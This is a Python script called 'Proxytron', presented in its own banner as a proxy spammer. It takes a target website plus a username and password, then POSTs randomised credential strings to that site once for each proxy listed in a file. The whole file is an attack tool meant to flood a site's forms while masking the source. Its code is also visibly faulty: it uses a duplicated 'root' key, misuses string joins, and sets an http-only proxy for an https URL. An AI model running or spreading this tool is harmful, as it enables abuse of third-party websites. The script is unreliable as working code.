import requests
import os
import random
import string
import json
import colorama
import threading
import ctypes
import sys
import time
import datetime

from colorama import Fore, Back, Style
from datetime import date
from time import gmtime, strftime

today = date.today()
d2 = today.strftime("%B %d, %Y")

os.system('cls')

ctypes.windll.kernel32.SetConsoleTitleW(f'Proxytron Loaded. | {d2}')

print(f"""{Style.BRIGHT + Fore.MAGENTA}
 ____                      _                   
|  _ \ _ __ _____  ___   _| |_ _ __ ___  _ __                       
| |_) | '__/ _ \ \/ / | | | __| '__/ _ \| '_ \                           
|  __/| | | (_) >  <| |_| | |_| | | (_) | | | |                    
|_|   |_|  \___/_/\_\\\__, |\__|_|  \___/|_| |_|
                     |___/                     

{Fore.WHITE}═══════════════════════════════════════════════
{Style.BRIGHT + Fore.MAGENTA}      Simple Proxy Spammer Made By Vortex.
    Make Sure You Put Proxies In 'proxy.txt'
          https://github.com/exploit
             Discord: Vortex#0911    
{Fore.WHITE}═══════════════════════════════════════════════

""")

website = input(f'{Fore.WHITE}Website:{Style.BRIGHT + Fore.MAGENTA} ')

username = input(f'{Fore.WHITE}Username:{Style.BRIGHT + Fore.MAGENTA} ')
password = input(f'{Fore.WHITE}Password:{Style.BRIGHT + Fore.MAGENTA} ')

ctypes.windll.kernel32.SetConsoleTitleW(f'Proxytron Spamming. | {website}')

url = f'https://{website}'

proxys = []
proxy_curr = 0

proxy_file = open("proxy.txt")
lines = proxy_file.readlines()

for g in lines:
    chars = string.ascii_letters + string.digits + '!@#$%^&*()'
    code = f'{username}'.join(random.choice(chars) for i in range(3))
    passw = f'{password}'.join(random.choices(string.ascii_letters + string.digits, k=4))

    data = {
        'root': code,
        'root': passw
    }

    try:
        print(f"{Fore.WHITE}Proxy Sent: {Style.BRIGHT + Fore.MAGENTA}{code} {Fore.WHITE}|{Style.BRIGHT + Fore.MAGENTA} {passw}")
        req = requests.post(url=url, data=data, proxies={'http': str(g)})
    except:
        print(f'Proxy Dead {str(g)}')
